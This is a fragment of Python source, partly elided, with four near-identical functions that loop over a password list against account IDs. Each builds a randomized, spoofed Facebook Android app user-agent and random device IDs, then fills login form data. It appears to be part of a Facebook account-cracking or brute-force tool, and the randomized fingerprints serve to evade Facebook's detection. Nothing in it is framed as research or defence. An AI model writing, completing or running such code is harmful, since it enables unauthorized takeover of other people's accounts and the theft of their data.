...
def M1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/196.0.0.46;FBBV/67214431;FBDM/{density=2.5,width=895,height=1967};FBLC/ja_JP;FBCR/Cellular One;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A315F;FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;]"
...
def M2(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/196.0.0.49;FBBV/17717844;FBDM/{density=1.0,width=1036,height=1920};FBLC/it_CH;FBCR/Mobily;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A326K;FBSV/12.1;nullFBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
...
def M3(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/196.0.0.22;FBBV/56003886;FBDM/{density=1.0,width=972,height=2102};FBLC/en_GB;FBCR/iWireless;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A013F;FBSV/12.0;nullFBCA/armeabi-v7a:armeabi;]"
...
def M4(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/196.0.0.75;FBBV/58670363;FBDM/{density=2.75,width=1241,height=2035};FBLC/en_GB;FBCR/Koodo Mobile;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A500XZ;FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
